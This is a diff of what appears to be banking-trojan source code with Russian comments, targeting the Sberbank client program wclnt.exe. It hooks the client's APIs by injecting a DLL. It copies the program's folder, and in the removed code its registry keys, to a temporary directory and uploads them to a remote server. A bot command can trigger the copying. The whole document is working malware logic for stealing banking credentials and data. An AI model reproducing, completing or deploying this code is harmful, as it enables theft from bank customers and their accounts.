@@ -29,6 +29,9 @@ namespace SBER_DOWNLOAD_DLL
 }
 #define DBG SBER_DOWNLOAD_DLL::DBGOutMessage<>
 
+namespace Sber
+{
+
 // Импорт из Sb.dll
 typedef BOOL( WINAPI *PInitFunc )		(DWORD origFunc, char *funcName);
 typedef VOID( WINAPI *PSetParams )		(char *AHost, char *AUid);
@@ -79,25 +82,6 @@ static PGetOpenFileNameA Real_GetOpenFileNameA;
 static PLoadLibraryExW Real_LoadLibraryExW;
 static PRegQueryValueExA Real_RegQueryValueExA;
 
-
-/************************************************************************/
-bool WINAPI IsSberProcess()
-{
-	// проверяем процесс ли это сбера. 
-	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH*sizeof (WCHAR) );
-	if ( ModulePath == NULL )return false;
-	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
-	DWORD dwProcessHash = GetNameHash( ModulePath );
-
-	if ( dwProcessHash == 0x321ecf12 )
-	{
-		MemFree( ModulePath );
-		return true;
-	}
-
-	MemFree( ModulePath );/**/
-	return false;
-}
 
 //создает имя файла для хранения dll в файле
 static PCHAR GetNameDll(char* uid)
@@ -181,7 +165,7 @@ static bool TranslateHook( HMEMORYMODULE dll, PInitFunc InitFunc, const char* na
 	return true;
 }
 
-bool HookSberApi()
+static bool HookSberApi()
 {
 	PCHAR UID = STR::Alloc(120);
 	GenerateUid(UID);
@@ -259,109 +243,122 @@ bool HookSberApi()
 	return true;
 }
 
-/************************************************************************/
-bool HookSber()
+//непосредственное копирование папки сбера, сначала коипрует во временную папку, а потом отсылает на сервер с временной папки
+static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
-	if ( IsSberProcess() )
+	char folderTmp[MAX_PATH], pathFlag[MAX_PATH], pathForExe[MAX_PATH];
+	if( GetAllUsersProfile( folderTmp, sizeof(folderTmp), "sbe" ) && //путь к временной папке
+		GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
+		GetAllUsersProfile( pathFlag, sizeof(pathFlag), "sbef.dat" ) )
+	{
+		char flag = 0;
+		File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //говорим что идет процесс копирования
+		DWORD sz = 0;
+		//путь к exe сбера
+		char* folderPrg = (char*)File::ReadToBufferA( pathForExe, sz );
+		if( folderPrg )
+		{
+			pPathRemoveFileSpecA(folderPrg); //оставляем только папку
+			*((int*)&(folderPrg[ m_lstrlen(folderPrg) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+			*((int*)&(folderTmp[ m_lstrlen(folderTmp) ])) = 0; 
+			//если папка, куда хотим временно перенести папку сбера, есть, то удаляем ее
+			if( Directory::IsExists(folderTmp) ) DeleteFolders(folderTmp);
+			pCreateDirectoryA( folderTmp, 0 );
+			DBG( "SBER", "Копирование во временную папку %s", folderTmp );
+			if( CopyFileANdFolder( folderPrg, folderTmp ) )
+			{
+				DBG( "SBER", "Копирование на сервер" );
+				StartSendThread( folderTmp, 0 /*"192.168.0.100"*/, NULL, 700 );
+				DeleteFolders(folderTmp);
+			}
+			flag = 1;
+			File::WriteBufferA( pathFlag, &flag, sizeof(flag) ); //говорим что процесс копирования окончен
+			MemFree(folderPrg);
+			pDeleteFileA(pathForExe);
+			DBG( "SBER", "Копирование закончено" );
+		}
+	}
+	return 0;
+}
+
+//запуск svchost.exe для копирования папки программы,
+//appName - путь к exe сбербанка (wclnt.exe),
+//force - true, если нужно произвести повторное копирование, false - если копирование уже было, то повторно не будет копировать
+static void StartCopyFolder( const char* appName, bool force )
+{
+	char pathForExe[MAX_PATH], pathFlag[MAX_PATH];
+	if( GetAllUsersProfile( pathForExe, sizeof(pathForExe), "sbe.dat" ) &&
+		GetAllUsersProfile( pathFlag, sizeof(pathFlag), "sbef.dat" ) )
+	{
+		bool run = true;
+		if( File::IsExists(pathFlag) )
+		{
+			DWORD sz;
+			char* data = (char*)File::ReadToBufferA( pathFlag, sz );
+			if( data[1] == 0 ) //идет копирование
+				run = false;
+			else //уже было скопировано
+				if( !force ) //повторное копирование не нужно
+					run = false;
+			MemFree(data);
+		}
+		if( run )
+		{
+			DBG( "SBER", "Запуск копирования папки" );
+			//сохраняем путь к exe относительно которого будем определять папку сбербанка
+			File::WriteBufferA( pathForExe, (void*)appName, m_lstrlen(appName) ); 
+			MegaJump(CopyFolderThread);
+		}
+		else
+			DBG( "SBER", "Уже было скопировано, повторно не нужно" );
+	}
+}
+
+//запуск копирования по версии программы
+static void CopyFolderForVersion( const char* appName )
+{
+	int size = (int)pGetFileVersionInfoSizeA( appName, 0 );
+	if( size > 0 )
+	{
+		char* data = (char*)MemAlloc(size);
+		pGetFileVersionInfoA( appName, 0, size, data );
+		WORD* lang;
+		pVerQueryValueA( data, "\\VarFileInfo\\Translation", (void**)&lang, &size );
+		if( size > 0 )
+		{
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			char keyVer[128], *valVer;
+			pwsprintfA( keyVer, "\\StringFileInfo\\%04x%04x\\FileVersion", (int)lang[0], (int)lang[1] );
+			pVerQueryValueA( data, keyVer, (void**)&valVer, &size );
+			if( size > 0 )
+			{
+				DBG( "SBER", "Версия программы %s", valVer );
+				if( m_lstrcmp( valVer, "7.16.1.2243" ) ) //"7.12.5.2225" ) == 0 ) 
+				{
+					StartCopyFolder( appName, false );
+				}
+			}
+		}
+		MemFree(data);
+	}
+}
+
+bool Init( const char* appName, DWORD appHash )
+{
+	if ( appHash == 0x321ecf12 /*wclnt.exe*/ )
 	{
 		UnhookSber();
 		HookSberApi();
+		CopyFolderForVersion(appName);
 		return true;
 	}
 	return false;
 }
 
-void FirstInitSber()
+bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
-	// проверяем запускался ли збер, и если нет то в свхосте стартуем копирование и передачу папки 
-	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
-	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\sbe.tmp"), sTEMPProfile, MAX_PATH);
-	if(FileExistsA(sTEMPProfile))
-	{		
-		//MegaJump(CopyFolderThread);
-	}
-	STR::Free(sTEMPProfile);
-
-}
-/************************************************************************/
-
-DWORD WINAPI CopyFolderThread( LPVOID lpData )
-{
-	
-	//Сначала копируем в темповую папку файлы, после чего их отправляем методом игоря вызываемым из длл
-	PCHAR Name;//= STR::Alloc(MAX_PATH);
-
-	PCHAR sTEMPProfileSB = STR::Alloc(MAX_PATH );
-	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\sbe.tmp"), sTEMPProfileSB, MAX_PATH);
-	if(FileExistsA(sTEMPProfileSB))
-	{
-		DWORD iSize;
-		char* NameFile=(PCHAR)File::ReadToBufferA(sTEMPProfileSB,iSize);
-		Name=STR::New(1,NameFile);
-
-		MemFree(NameFile);
-	}
-	else
-	{
-		STR::Free(sTEMPProfileSB);
-		return 0;
-	}
-	
-	// откуда копируем
-
-	DBG("SBER","CopyFolderThread %s",Name);
-	pPathRemoveFileSpecA(Name);
-
-	// добавляем в конце два нулевых символа
-	int ii=m_lstrlen(Name);
-	Name[ii]='\0';
-	Name[ii+1]='\0';
-
-	// куда копируем
-	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
-	m_memset(sTEMPProfile,0,MAX_PATH);
-	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\dat"), sTEMPProfile, MAX_PATH);
-	pCreateDirectoryA(sTEMPProfile,NULL);
-
-
-	PCHAR FileReg1=STR::New(2,sTEMPProfile,"\\HKLMSOFTWARE.SBR");
-	PCHAR FileReg2=STR::New(2,sTEMPProfile,"\\HKCUSOFTWARE.SBR");
-	DBG("SBER","CopyFolderThread %s",FileReg1);
-	DBG("SBER","CopyFolderThread %s",FileReg2);
-
-	// добавляем в конце два нулевых символа
-	int i=m_lstrlen(sTEMPProfile);
-	sTEMPProfile[i]='\0';
-	sTEMPProfile[i+1]='\0';
-	
-	// Само копирование
-	bool isSend=CopyFileANdFolder(Name,sTEMPProfile);
-	
-	Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE	,"SOFTWARE\\SBRF",FileReg1);
-	Registry::SaveRegKeyPath(HKEY_CURRENT_USER	,"SOFTWARE\\SBRF",FileReg2);
-	STR::Free(FileReg1);
-	STR::Free(FileReg1);
-	
-	//Отправка
-	StartSendThread(sTEMPProfile,NULL,NULL,700);
-
-	
-	if(isSend)
-	{
-		DBG("SBER","мочим папку %s",sTEMPProfile);
-		sTEMPProfile[i]='\0';
-		sTEMPProfile[i+1]='\0';
-		DeleteFolders(sTEMPProfile);
-		//ClearDirectory(sTEMPProfile);
-		File::WriteBufferA(sTEMPProfile, (void *)"123",3);
-	}
-	else
-		DBG("SBER","not мочим папку %s",sTEMPProfile);
-
-	///
-	STR::Free(sTEMPProfileSB);
-	STR::Free(sTEMPProfile);
-	STR::Free(Name);
+	StartCopyFolder( "d:\\clnt590\\wclnt.exe", true );
 	return 0;
 }
 
+};
